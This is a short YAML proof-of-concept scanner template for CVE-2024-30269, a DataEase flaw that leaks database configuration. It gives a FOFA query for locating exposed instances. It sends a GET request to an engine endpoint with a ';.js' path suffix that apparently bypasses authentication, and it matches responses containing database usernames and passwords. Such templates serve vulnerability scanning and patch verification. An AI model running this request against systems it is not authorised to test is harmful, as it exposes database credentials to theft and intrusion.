id: poc-yaml-dataease-config-info-leak
info:
  name: DataEase数据库配置信息泄露漏洞（CVE-2024-30269）
  severity: high
  tags:
  - 信息泄露
  - CVE-2024-30269
  finger: dataease
  fofa: body="Dataease"
requests:
- method: GET
  path: /de2api/engine/getEngine;.js
  expression: "status_code == 200 && \ncontains(find_json(body,\"data.configuration\"\
    ), \"password\") && \ncontains(find_json(body,\"data.configuration\"), \"username\"\
    ) && \ncontains(find_json(body,\"data.configuration\"), \"dataease\")\n"
variables: {}
transport: http
